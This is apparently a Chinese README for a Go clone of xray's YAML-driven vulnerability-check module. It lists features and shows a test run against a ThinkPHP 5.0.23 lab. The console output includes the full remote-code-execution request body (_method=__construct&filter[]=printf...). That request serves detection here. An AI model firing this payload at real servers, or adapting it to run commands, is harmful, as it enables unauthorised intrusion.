长亭科技出品的[xray](https://github.com/chaitin/xray)真心👍，🐂🍺!!!!!!

正好学了Golang，复现了下xray的poc功能模块，其中提到的Google的cel-go表达式没有摸懂，使用笨拙的方法来匹配。

## Tasklist

- [x] 解析YAML
- [x] HTTP发包
- [x] 表达式预处理
- [x] 模式匹配
- [x] 常用函数
- [x] goroutine​并发
- [x] flag传参​
- [ ] 批量获取目标
- [ ] 302跳转
- [ ] 自定义变量set
- [ ] reverse反连平台

## Test

漏洞环境：[thinkphp/5.0.23-rce](https://vulhub.org/#/environments/thinkphp/5.0.23-rce/)

POC：[thinkphp5023-method-rce.yml](https://github.com/chaitin/xray/blob/master/pocs/thinkphp5023-method-rce.yml)

```
[Sewell]: ~/Documents/xray_poc_demo ✗ master*
➜  ./xray_poc_demo --poc thinkphp5023-method-rce.yml --url http://34.xxx.69.xxx:8080
------------------ 1 ------------------
* rule:{Method:POST Path:/index.php?s=captcha Headers:{Cookie: ContentType:application/x-www-form-urlencoded} Body:_method=__construct&filter[]=printf&method=GET&server[REQUEST_METHOD]=TmlnaHQgZ2F0aGVycywgYW5%25%25kIG5vdyBteSB3YXRjaCBiZWdpbnMu&get[]=1
 Search: FollowRedirects:false Expression:response.body.bcontains(b'TmlnaHQgZ2F0aGVycywgYW5%kIG5vdyBteSB3YXRjaCBiZWdpbnMu1')
}
* resp: 200 map[Content-Type:[text/html; charset=UTF-8] Date:[Fri, 13 Dec 2019 05:58:16 GMT] Server:[Apache/2.4.25 (Debian)] Vary:[Accept-Encoding] X-Powered-By:[PHP/7.2.12]]
* expr: &{Body:bcontains(b'TmlnaHQgZ2F0aGVycywgYW5%kIG5vdyBteSB3YXRjaCBiZWdpbnMu1') ContentType: Status:}
* Vuln: poc-yaml-thinkphp5023-method-rce
* Target: http://34.xxx.69.xxx:8080
```
